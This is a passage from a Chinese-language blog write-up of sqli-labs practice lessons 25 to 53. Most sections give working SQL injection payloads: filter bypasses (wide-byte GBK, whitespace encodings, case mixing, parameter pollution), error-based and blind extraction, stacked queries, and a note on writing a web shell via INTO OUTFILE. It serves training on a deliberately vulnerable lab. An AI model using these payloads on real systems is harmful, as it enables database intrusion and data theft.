class="highlight sql hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-keyword">UPDATE</span> <span class="hljs-keyword">users</span> <span class="hljs-keyword">SET</span> passwd=<span class="hljs-string">"New_Pass"</span> <span class="hljs-keyword">WHERE</span> username =<span class="hljs-string">'admin'</span><span class="hljs-comment">#'xxxx</span></span><br></pre></td></tr></tbody></table></figure><p></p><p>这样<code>#</code>就注释掉了后面的 sql 语句</p><h3 id="Less-25"><a href="#Less-25" class="headerlink" title="Less-25"></a>Less-25</h3><p>题目很直接，提示直接把 <code>or</code>、<code>and</code>过滤了，但是可以用<code>&amp;&amp;</code>、<code>||</code>绕过</p><p></p><figure class="highlight sql hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">admin'||updatexml(1,concat(0x7e,(<span class="hljs-keyword">select</span> @@<span class="hljs-keyword">version</span>),<span class="hljs-number">0x7e</span>),<span class="hljs-number">1</span>)<span class="hljs-comment">#</span></span><br></pre></td></tr></tbody></table></figure><p></p><p>也可以双写绕过</p><p></p><figure class="highlight sql hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0' union <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-keyword">group_concat</span>(schema_name) <span class="hljs-keyword">from</span> infoorrmation_schema.schemata;<span class="hljs-comment">#</span></span><br></pre></td></tr></tbody></table></figure><p></p><h3 id="Less-25a"><a href="#Less-25a" class="headerlink" title="Less-25a"></a>Less-25a</h3><p></p><figure class="highlight sql hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-1 union <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-keyword">group_concat</span>(schema_name) <span class="hljs-keyword">from</span> infoorrmation_schema.schemata %<span class="hljs-number">23</span></span><br></pre></td></tr></tbody></table></figure><p></p><h3 id="Less-26"><a href="#Less-26" class="headerlink" title="Less-26"></a>Less-26</h3><p>题目提示空格与注释被过滤了，可以使用<code>%0a</code>绕过，可以盲注也可以报错注入</p><p></p><figure class="highlight lsl hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-number">0</span>'||left(database(),<span class="hljs-number">1</span>)&gt;'s'%<span class="hljs-number">26</span>%<span class="hljs-number">26</span>'<span class="hljs-number">1</span>'='<span class="hljs-number">1</span>	</span><br><span class="line"><span class="hljs-number">0</span>'||updatexml(<span class="hljs-number">1</span>,concat(<span class="hljs-number">0x7e</span>,(Select%<span class="hljs-number">0</span>a@@version),<span class="hljs-number">0x7e</span>),<span class="hljs-number">1</span>)||'<span class="hljs-number">1</span>'='<span class="hljs-number">1</span></span><br></pre></td></tr></tbody></table></figure><p></p><h3 id="Less-26a"><a href="#Less-26a" class="headerlink" title="Less-26a"></a>Less-26a</h3><p>题目提示空格与注释被过滤了，可以使用<code>%a0</code>绕过，报错注入不出，可以用布尔盲注</p><p></p><figure class="highlight lsl hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-number">0</span>'||'<span class="hljs-number">1</span>'='<span class="hljs-number">1</span>	#探测为'</span><br><span class="line"><span class="hljs-number">0</span>'||left(database(),<span class="hljs-number">1</span>)='s'%<span class="hljs-number">26</span>%<span class="hljs-number">26</span>'<span class="hljs-number">1</span>'='<span class="hljs-number">1</span></span><br><span class="line"></span><br><span class="line">白盒审计知道是')</span><br><span class="line"><span class="hljs-number">0</span>%<span class="hljs-number">27</span>)%a0union%a0select%a01,database(),<span class="hljs-number">2</span>||('<span class="hljs-number">1</span></span><br><span class="line"><span class="hljs-number">0</span>%<span class="hljs-number">27</span>)%a0union%a0select%a01,database(),<span class="hljs-number">2</span>;%<span class="hljs-number">00</span></span><br></pre></td></tr></tbody></table></figure><p></p><h3 id="Less-27"><a href="#Less-27" class="headerlink" title="Less-27"></a>Less-27</h3><p>题目提示<code>union</code>与<code>select</code>被过滤了，可用大小写绕过</p><p></p><figure class="highlight lsl hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-number">0</span>'||'<span class="hljs-number">1</span>'='<span class="hljs-number">1</span></span><br><span class="line"><span class="hljs-number">0</span>'||left(database(),<span class="hljs-number">1</span>)='s'%<span class="hljs-number">26</span>%<span class="hljs-number">26</span>'<span class="hljs-number">1</span>'='<span class="hljs-number">1</span></span><br><span class="line"></span><br><span class="line"><span class="hljs-number">0</span>'%<span class="hljs-number">0</span>AunIon%<span class="hljs-number">0</span>AselEct%<span class="hljs-number">0</span>A1,group_concat(schema_name),<span class="hljs-number">2</span>%<span class="hljs-number">0</span>Afrom%<span class="hljs-number">0</span>Ainformation_schema.schemata;%<span class="hljs-number">00</span></span><br></pre></td></tr></tbody></table></figure><p></p><h3 id="Less-27a"><a href="#Less-27a" class="headerlink" title="Less-27a"></a>Less-27a</h3><p>增加了<code>"</code></p><p></p><figure class="highlight perl hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-number">0</span><span class="hljs-string">"%0AunIon%0AselEct%0A1,group_concat(schema_name),2%0Afrom%0Ainformation_schema.schemata;%00</span></span><br></pre></td></tr></tbody></table></figure><p></p><h3 id="Less-28"><a href="#Less-28" class="headerlink" title="Less-28"></a>Less-28</h3><p><code>union select</code>大小写均被过滤，但是<code>select</code>还可单独用，盲注即可</p><p></p><figure class="highlight lsl hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-number">0</span>')||left(database(),<span class="hljs-number">1</span>)&gt;'s';%<span class="hljs-number">00</span></span><br></pre></td></tr></tbody></table></figure><p></p><h3 id="Less-28a"><a href="#Less-28a" class="headerlink" title="Less-28a"></a>Less-28a</h3><p>依然可以用盲注</p><p></p><figure class="highlight lsl hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-number">0</span>')||left((database()),<span class="hljs-number">1</span>)='s';%<span class="hljs-number">00</span></span><br><span class="line"><span class="hljs-number">0</span>')||left((selEct%<span class="hljs-number">0</span>agroup_concat(schema_name)%<span class="hljs-number">0</span>afrom%<span class="hljs-number">0</span>Ainformation_schema.schemata),<span class="hljs-number">1</span>)&lt;'s';%<span class="hljs-number">00</span></span><br></pre></td></tr></tbody></table></figure><p></p><h3 id="Less-29"><a href="#Less-29" class="headerlink" title="Less-29"></a>Less-29</h3><p>利用<code>tomcat</code>与<code>apache</code>解析相同请求参数不同的特性，<code>tomcat</code>解析相同请求参数取第一个，而<code>apache</code>取第二个，如<code>?id=1&amp;id=2</code>，<code>tomcat</code>取得1，<code>apache</code>取得2</p><p></p><figure class="highlight lsl hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=<span class="hljs-number">1</span>&amp;id=<span class="hljs-number">0</span>' union selEct <span class="hljs-number">1</span>,group_concat(schema_name),<span class="hljs-number">2</span> from information_schema.schemata;%<span class="hljs-number">23</span></span><br></pre></td></tr></tbody></table></figure><p></p><h3 id="Less-30"><a href="#Less-30" class="headerlink" title="Less-30"></a>Less-30</h3><p>与 29 架构一样，原理一致只不过加了<code>"</code>限制</p><p></p><figure class="highlight sql hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&amp;id=0" union <span class="hljs-keyword">selEct</span> <span class="hljs-number">1</span>,<span class="hljs-keyword">group_concat</span>(schema_name),<span class="hljs-number">2</span> <span class="hljs-keyword">from</span> information_schema.schemata;%23</span><br></pre></td></tr></tbody></table></figure><p></p><h3 id="Less-31"><a href="#Less-31" class="headerlink" title="Less-31"></a>Less-31</h3><p>架构一样，多了<code>")</code></p><p></p><figure class="highlight sql hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&amp;id=0") union <span class="hljs-keyword">selEct</span> <span class="hljs-number">1</span>,<span class="hljs-keyword">group_concat</span>(schema_name),<span class="hljs-number">2</span> <span class="hljs-keyword">from</span> information_schema.schemata;%23</span><br></pre></td></tr></tbody></table></figure><p></p><h3 id="Less-32"><a href="#Less-32" class="headerlink" title="Less-32"></a>Less-32</h3><p>注意是<code>GBK</code>，可以用<code>%df</code>进行宽字节注入</p><p></p><figure class="highlight lsl hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-number">0</span>%df%<span class="hljs-number">27</span>%<span class="hljs-number">20</span>or%<span class="hljs-number">201</span>=<span class="hljs-number">1</span>%<span class="hljs-number">23</span></span><br><span class="line"><span class="hljs-number">0</span>%df' union selEct <span class="hljs-number">1</span>,group_concat(schema_name),<span class="hljs-number">2</span> from information_schema.schemata;%<span class="hljs-number">23</span></span><br></pre></td></tr></tbody></table></figure><p></p><h3 id="Less-33"><a href="#Less-33" class="headerlink" title="Less-33"></a>Less-33</h3><p></p><figure class="highlight lsl hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-number">0</span>%df' union selEct <span class="hljs-number">1</span>,group_concat(schema_name),<span class="hljs-number">2</span> from information_schema.schemata;%<span class="hljs-number">23</span></span><br></pre></td></tr></tbody></table></figure><p></p><h3 id="Less-34"><a href="#Less-34" class="headerlink" title="Less-34"></a>Less-34</h3><p></p><figure class="highlight lsl hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uname=<span class="hljs-number">0</span>%df'%<span class="hljs-number">20</span>union+selEct%<span class="hljs-number">201</span>,group_concat(schema_name)%<span class="hljs-number">20</span>from%<span class="hljs-number">20</span>information_schema.schemata%<span class="hljs-number">3</span>b%<span class="hljs-number">23</span>&amp;passwd=<span class="hljs-number">1</span>&amp;submit=Submit</span><br></pre></td></tr></tbody></table></figure><p></p><h3 id="Less-35"><a href="#Less-35" class="headerlink" title="Less-35"></a>Less-35</h3><p></p><figure class="highlight crystal hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-number">0</span> <span class="hljs-class"><span class="hljs-keyword">union</span> <span class="hljs-title">selEct</span> 1,<span class="hljs-title">group_concat</span>(<span class="hljs-title">schema_name</span>),2 <span class="hljs-title">from</span> <span class="hljs-title">information_schema</span>.<span class="hljs-title">schemata</span>;</span>%<span class="hljs-number">23</span></span><br></pre></td></tr></tbody></table></figure><p></p><h3 id="Less-36"><a href="#Less-36" class="headerlink" title="Less-36"></a>Less-36</h3><p></p><figure class="highlight angelscript hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-number">0</span>%df%<span class="hljs-number">27</span>%<span class="hljs-number">20</span>union%<span class="hljs-number">20</span>selEct%<span class="hljs-number">201</span>,group_concat(schema_name),<span class="hljs-number">2</span>%<span class="hljs-number">20f</span>rom%<span class="hljs-number">20</span>information_schema.schemata;%<span class="hljs-number">23</span></span><br><span class="line"><span class="hljs-number">-1</span>%EF%BF%BD%<span class="hljs-number">27</span>union%<span class="hljs-number">20</span>select%<span class="hljs-number">201</span>,user(),<span class="hljs-number">3</span>--+</span><br></pre></td></tr></tbody></table></figure><p></p><h3 id="Less-37"><a href="#Less-37" class="headerlink" title="Less-37"></a>Less-37</h3><p></p><figure class="highlight angelscript hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uname=<span class="hljs-number">0</span>%df%<span class="hljs-number">27</span>%<span class="hljs-number">20</span>union%<span class="hljs-number">20</span>selEct%<span class="hljs-number">20</span>group_concat(schema_name),<span class="hljs-number">2</span>%<span class="hljs-number">20f</span>rom%<span class="hljs-number">20</span>information_schema.schemata;%<span class="hljs-number">23</span>&amp;passwd=<span class="hljs-number">1</span>&amp;submit=Submit</span><br></pre></td></tr></tbody></table></figure><p></p><h3 id="Less-38"><a href="#Less-38" class="headerlink" title="Less-38"></a>Less-38</h3><p>堆叠注入，成功创建<code>test</code>数据表</p><p></p><figure class="highlight sql hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1';<span class="hljs-keyword">create</span> <span class="hljs-keyword">table</span> <span class="hljs-keyword">test</span> <span class="hljs-keyword">like</span> <span class="hljs-keyword">users</span>;%23</span><br></pre></td></tr></tbody></table></figure><p></p><h3 id="Less-39"><a href="#Less-39" class="headerlink" title="Less-39"></a>Less-39</h3><p></p><figure class="highlight sql hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1;<span class="hljs-keyword">create</span> <span class="hljs-keyword">table</span> test39 <span class="hljs-keyword">like</span> <span class="hljs-keyword">users</span>;%23</span><br></pre></td></tr></tbody></table></figure><p></p><h3 id="Less-40"><a href="#Less-40" class="headerlink" title="Less-40"></a>Less-40</h3><p></p><figure class="highlight sql hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1');<span class="hljs-keyword">create</span> <span class="hljs-keyword">table</span> test40 <span class="hljs-keyword">like</span> <span class="hljs-keyword">users</span>;%23</span><br></pre></td></tr></tbody></table></figure><p></p><h3 id="Less-41"><a href="#Less-41" class="headerlink" title="Less-41"></a>Less-41</h3><p></p><figure class="highlight sql hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1;<span class="hljs-keyword">create</span> <span class="hljs-keyword">table</span> test41 <span class="hljs-keyword">like</span> <span class="hljs-keyword">users</span>;%23</span><br></pre></td></tr></tbody></table></figure><p></p><h3 id="Less-42"><a href="#Less-42" class="headerlink" title="Less-42"></a>Less-42</h3><p><code>password</code>处无过滤</p><p></p><figure class="highlight lsl hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">login_user=<span class="hljs-number">1</span>&amp;login_password=<span class="hljs-number">1</span>'%<span class="hljs-number">3</span>bcreate+table+test43+like+users%<span class="hljs-number">3</span>b%<span class="hljs-number">23</span>&amp;mysubmit=Login</span><br></pre></td></tr></tbody></table></figure><p></p><h3 id="Less-43"><a href="#Less-43" class="headerlink" title="Less-43"></a>Less-43</h3><p><code>password</code>处无过滤</p><p></p><figure class="highlight lsl hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">login_user=<span class="hljs-number">1</span>&amp;login_password=<span class="hljs-number">1</span>')%<span class="hljs-number">3</span>bcreate+table+test43+like+users%<span class="hljs-number">3</span>b%<span class="hljs-number">23</span>&amp;mysubmit=Login</span><br></pre></td></tr></tbody></table></figure><p></p><h3 id="Less-44"><a href="#Less-44" class="headerlink" title="Less-44"></a>Less-44</h3><p></p><figure class="highlight lsl hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">login_user=<span class="hljs-number">1</span>&amp;login_password=<span class="hljs-number">1</span>'%<span class="hljs-number">3</span>bcreate+table+test44+like+users%<span class="hljs-number">3</span>b%<span class="hljs-number">23</span>&amp;mysubmit=Login</span><br></pre></td></tr></tbody></table></figure><p></p><h3 id="Less-45"><a href="#Less-45" class="headerlink" title="Less-45"></a>Less-45</h3><p></p><figure class="highlight lsl hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">login_user=<span class="hljs-number">1</span>&amp;login_password=<span class="hljs-number">1</span>')%<span class="hljs-number">3</span>bcreate+table+test45+like+users%<span class="hljs-number">3</span>b%<span class="hljs-number">23</span>&amp;mysubmit=Login</span><br></pre></td></tr></tbody></table></figure><p></p><h3 id="Less-46"><a href="#Less-46" class="headerlink" title="Less-46"></a>Less-46</h3><p><code>order by</code>注入</p><p><code>username</code>、<code>password</code>均为列名，所以以下需要知道列名</p><p></p><figure class="highlight angelscript hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">?order=<span class="hljs-keyword">if</span>(<span class="hljs-number">1</span>=<span class="hljs-number">1</span>,username,password)</span><br><span class="line">?order=<span class="hljs-literal">null</span>,<span class="hljs-keyword">if</span>(<span class="hljs-number">1</span>=<span class="hljs-number">1</span>,username,password)</span><br><span class="line">?order=(<span class="hljs-keyword">case</span> when (<span class="hljs-number">1</span>=<span class="hljs-number">1</span>) then username <span class="hljs-keyword">else</span> password end)</span><br><span class="line">?order=ifnull(<span class="hljs-literal">null</span>, username)</span><br><span class="line">?order=rand(<span class="hljs-number">1</span>=<span class="hljs-number">1</span>)    <span class="hljs-comment">//order by rand(1)/rand(0)两者返回不一样</span></span><br><span class="line">?order=(select <span class="hljs-number">1</span> regexp <span class="hljs-keyword">if</span>(<span class="hljs-number">1</span>=<span class="hljs-number">1</span>,<span class="hljs-number">1</span>,<span class="hljs-number">0x00</span>))</span><br></pre></td></tr></tbody></table></figure><p></p><p>将<code>1=1</code>换成bool盲注的语句函数即可用于获取数据<br><code>sort=rand(ascii(database(),1))=115)</code></p><p>时间盲注</p><p></p><figure class="highlight lisp hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sort=1 and if(<span class="hljs-name">ascii</span>(<span class="hljs-name">substr</span>(<span class="hljs-name">database</span>(),<span class="hljs-number">1</span>,<span class="hljs-number">1</span>))=116,<span class="hljs-number">0</span>,sleep(<span class="hljs-number">5</span>))</span><br><span class="line">sort=(<span class="hljs-name">select</span> if(<span class="hljs-name">substring</span>(<span class="hljs-name">current</span>,<span class="hljs-number">1</span>,<span class="hljs-number">1</span>)=char(<span class="hljs-number">115</span>),benchmatrk(<span class="hljs-number">5000000</span>,md5('<span class="hljs-number">1</span>')),null) from (<span class="hljs-name">select</span> database() as current) as tb1)</span><br></pre></td></tr></tbody></table></figure><p></p><p>Bool 盲注</p><p></p><figure class="highlight stylus hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-function"><span class="hljs-title">rand</span><span class="hljs-params">(ascii(left(database()</span></span>),<span class="hljs-number">1</span>))=<span class="hljs-number">115</span>)</span><br></pre></td></tr></tbody></table></figure><p></p><p>报错注入：</p><p></p><figure class="highlight routeros hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">updatexml(1,<span class="hljs-keyword">if</span>(<span class="hljs-attribute">1</span>=1,concat(0x7e,version()),2),1)</span><br><span class="line">(select count(*) <span class="hljs-keyword">from</span> information_schema.columns<span class="hljs-built_in"> group </span>by concat(0x3a,0x3a,(select user()),0x3a,0x3a,floor(rand()<span class="hljs-number">*2</span>)))</span><br></pre></td></tr></tbody></table></figure><p></p><p>procedure analyse 参数后注入</p><p></p><figure class="highlight cal hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sort=<span class="hljs-number">1</span> <span class="hljs-function"><span class="hljs-keyword">procedure</span> <span class="hljs-title">analyse</span><span class="hljs-params">(extractvalue(rand()</span>,<span class="hljs-title">concat</span><span class="hljs-params">(0x3a,version()</span>)),1)</span></span><br></pre></td></tr></tbody></table></figure><p></p><p>into outfile参数:</p><p></p><figure class="highlight applescript hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-built_in">id</span>=<span class="hljs-number">1</span> <span class="hljs-keyword">into</span> outfield <span class="hljs-string">"path"</span></span><br></pre></td></tr></tbody></table></figure><p></p><p>上传网马，可以在后面加上<code>lines terminated by 16</code>进制转码的数据</p><h3 id="Less-47"><a href="#Less-47" class="headerlink" title="Less-47"></a>Less-47</h3><p>有<code>'</code>，可以用报错</p><p></p><figure class="highlight lisp hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-number">1</span>'and (<span class="hljs-name">select</span> count(<span class="hljs-name">*</span>) from information_schema.columns group by concat(<span class="hljs-number">0</span>x3a,<span class="hljs-number">0</span>x3a,(<span class="hljs-name">select</span> user()),<span class="hljs-number">0</span>x3a,<span class="hljs-number">0</span>x3a,floor(<span class="hljs-name">rand</span>()*2)))--+</span><br><span class="line">1'and (select * from (<span class="hljs-name">select</span> NAME_CONST(<span class="hljs-name">version</span>(),<span class="hljs-number">1</span>),NAME_CONST(<span class="hljs-name">version</span>(),<span class="hljs-number">1</span>))x)--+</span><br></pre></td></tr></tbody></table></figure><p></p><p>也可以用时间盲注</p><p></p><figure class="highlight lisp hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-number">1</span>'and If(<span class="hljs-name">ascii</span>(<span class="hljs-name">substr</span>(<span class="hljs-name">database</span>(),<span class="hljs-number">1</span>,<span class="hljs-number">1</span>))=115,<span class="hljs-number">0</span>,sleep (<span class="hljs-number">5</span>))--+</span><br></pre></td></tr></tbody></table></figure><p></p><p>procedure analyse 参数后注入</p><p></p><figure class="highlight lisp hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-number">1</span>'procedure analyse(<span class="hljs-name">extractvalue</span>(<span class="hljs-name">rand</span>(),concat(<span class="hljs-number">0</span>x3a,version())),<span class="hljs-number">1</span>)--+</span><br></pre></td></tr></tbody></table></figure><p></p><h3 id="Less-48"><a href="#Less-48" class="headerlink" title="Less-48"></a>Less-48</h3><p></p><figure class="highlight lisp hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-number">1</span> and If(<span class="hljs-name">ascii</span>(<span class="hljs-name">substr</span>(<span class="hljs-name">database</span>(),<span class="hljs-number">1</span>,<span class="hljs-number">1</span>))&gt;115,<span class="hljs-number">0</span>,sleep (<span class="hljs-number">5</span>))--+</span><br><span class="line">sort=rand(<span class="hljs-name">ascii</span>(<span class="hljs-name">left</span>(<span class="hljs-name">database</span>(),<span class="hljs-number">1</span>))=115)</span><br></pre></td></tr></tbody></table></figure><p></p><h3 id="Less-49"><a href="#Less-49" class="headerlink" title="Less-49"></a>Less-49</h3><p></p><figure class="highlight routeros hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">1<span class="hljs-string">' and If(ascii(substr(database(),1,1))=115,0,sleep (5))--+</span></span><br><span class="line"><span class="hljs-string">1'</span> <span class="hljs-keyword">and</span> (<span class="hljs-keyword">If</span>(ascii(substr((select username <span class="hljs-keyword">from</span><span class="hljs-built_in"> users </span>where <span class="hljs-attribute">id</span>=1),1,1))=68,0,sleep(5)))--+</span><br></pre></td></tr></tbody></table></figure><p></p><h3 id="Less-50"><a href="#Less-50" class="headerlink" title="Less-50"></a>Less-50</h3><p>堆叠注入</p><p></p><figure class="highlight sql hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1;<span class="hljs-keyword">create</span> <span class="hljs-keyword">table</span> test50 <span class="hljs-keyword">like</span> <span class="hljs-keyword">users</span>;%23</span><br></pre></td></tr></tbody></table></figure><p></p><h3 id="Less-51"><a href="#Less-51" class="headerlink" title="Less-51"></a>Less-51</h3><p></p><figure class="highlight sql hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1';<span class="hljs-keyword">create</span> <span class="hljs-keyword">table</span> test51 <span class="hljs-keyword">like</span> <span class="hljs-keyword">users</span>;%23</span><br></pre></td></tr></tbody></table></figure><p></p><h3 id="Less-52"><a href="#Less-52" class="headerlink" title="Less-52"></a>Less-52</h3><p></p><figure class="highlight sql hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1;<span class="hljs-keyword">create</span> <span class="hljs-keyword">table</span> test52 <span class="hljs-keyword">like</span> <span class="hljs-keyword">users</span>;%23</span><br></pre></td></tr></tbody></table></figure><p></p><h3 id="Less-53"><a href="#Less-53" class="headerlink" title="Less-53"></a>Less-53</h3><p></p><figure class="highlight sql hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1';<span class="hljs-keyword">create</span> <span class="hljs-keyword">table</span> test53 <span class="hljs-keyword">like</span> <span class="hljs-keyword">users</span>;%23</span><br></pre></td></tr></tbody></table></figure><p></p><script>window.imageLazyLoadSetting={isSPA:!1,preloadRatio:1,processImages:null}</script><script>window.addEventListener("load",function(){var t=/\.(gif|jpg|jpeg|tiff|png)$/i,r=/^data:image\/[a-z]+;base64,/;Array.prototype.slice.call(document.querySelectorAll("img[data-original]")).forEach(function(a){var e=a.parentNode;"A"===e.tagName&&(e.href.match(t)||e.href.match(r))&&(e.href=a.dataset.original)})})</script><script>!function(n){n.imageLazyLoadSetting.processImages=o;var e=n.imageLazyLoadSetting.isSPA,i=n.imageLazyLoadSetting.preloadRatio||1,r=Array.prototype.slice.call(document.querySelectorAll("img[data-original]"));function o(){e&&(r=Array.prototype.slice.call(document.querySelectorAll("img[data-original]")));for(var t,a=0;a<r.length;a++)0<=(t=(t=r[a]).getBoundingClientRect()).bottom&&0<=t.left&&t.top<=(n.innerHeight*i||document.documentElement.clientHeight*i)&&function(){var t,e,n,i,o=r[a];t=o,e=function(){r=r.filter(function(t){return o!==t})},n=new Image,i=t.getAttribute("data-original"),n.onload=function(){t.src=i,e()},t.src!==i&&(n.src=i)}()}o(),n.addEventListener("scroll",function(){var t,e;t=o,e=n,clearTimeout(t.tId),t.tId=setTimeout(function(){t.call(e)},500)})}(this)</script><script>window.imageLazyLoadSetting={isSPA:!1,preloadRatio:1,processImages:null}</script><script>window.addEventListener("load",function(){var t=/\.(gif|jpg|jpeg|tiff|png)$/i,r=/^data:image\/[a-z]+;base64,/;Array.prototype.slice.call(document.querySelectorAll("img[data-original]")).forEach(function(a){var e=a.parentNode;"A"===e.tagName&&(e.href.match(t)||e.href.match(r))&&(e.href=a.dataset.original)})})</script><script>!function(n){n.imageLazyLoadSetting.processImages=o;var e=n.imageLazyLoadSetting.isSPA,i=n.imageLazyLoadSetting.preloadRatio||1,r=Array.prototype.slice.call(document.querySelectorAll("img[data-original]"));function o(){e&&(r=Array.prototype.slice.call(document.querySelectorAll("img[data-original]")));for(var t,a=0;a<r.length;a++)0<=(t=(t=r[a]).getBoundingClientRect()).bottom&&0<=t.left&&t.top<=(n.innerHeight*i||document.documentElement.clientHeight*i)&&function(){var t,e,n,i,o=r[a];t=o,e=function(){r=r.filter(function(t){return o!==t})},n=new Image,i=t.getAttribute("data-original"),n.onload=function(){t.src=i,e()},t.src!==i&&(n.src=i)}()}o(),n.addEventListener("scroll",function(){var t,e;t=o,e=n,clearTimeout(t.tId),t.tId=setTimeout(function(){t.call(e)},500)})}(this)</script></body></html></div><div class="columns is-variable is-1 is-multiline is-mobile"> <span class="column is-narrow"><a class="tag is-light article-tag" href="/tags/Sec/">#Sec</a></span> <span class="column is-narrow"><a class="tag is-light article-tag" href="/tags/sql%E6%B3%A8%E5%85%A5/">#sql注入</a></span></div><hr><blockquote class="colorquote info"><p>Article Author: Zeddy</p><p>Article Link: https://blog.zeddyu.info/2019/03/03/Sqli-lab%E9%80%9F%E5%88%B7%E8%AE%B0%E5%BD%95(1-53)/index.html</p><p>Copyright Notice: With the exception of the special statement at the beginning of the article, all articles can be reprinted in accordance with the CC BY 4.0 agreement with the author&#39;s permission.</p></blockquote><blockquote class="colorquote success"><p>Ad: I am looking for some guys who have a strong interest in CTFs to build a team focused on international CTFs that are on the ctftime.org, if anyone is interested in this idea you can take a look at here: https://blog.zeddyu.info/advertisement/</p><p>Ad: 想了解更多有意思的国际赛 CTF 中 Web 知识技巧，欢迎加入我的 <a href="https://blog.zeddyu.info/advertisement/#知识星球" target="_blank" rel="noopener">知识星球</a> ; 另外我正在召集一群小伙伴组建一支专注国际 CTF 的队伍，如果有感兴趣的小伙伴也可在 <a href="https://blog.zeddyu.info/advertisement/#International-CTF-Team" target="_blank" rel="noopener">International CTF Team</a> 查看详情</p></blockquote><div class="columns is-mobile is-multiline article-nav"> <span class="column is-12-mobile is-half-desktop article-nav-prev"><a href="/2019/03/04/Sqli-lab%20Challenges%20Write%20up/">Sqli-lab Challenges Write up</a></span> <span class="column is-12-mobile is-half-desktop article-nav-next"><a href="/2019/02/28/Some-Tricks-of-Bypass-php-waf/">Some Tricks of Bypass php waf</a></span></div></article><div class="comments"><h3 class="title is-4">Comments</h3><script>function loadDisqus(){var 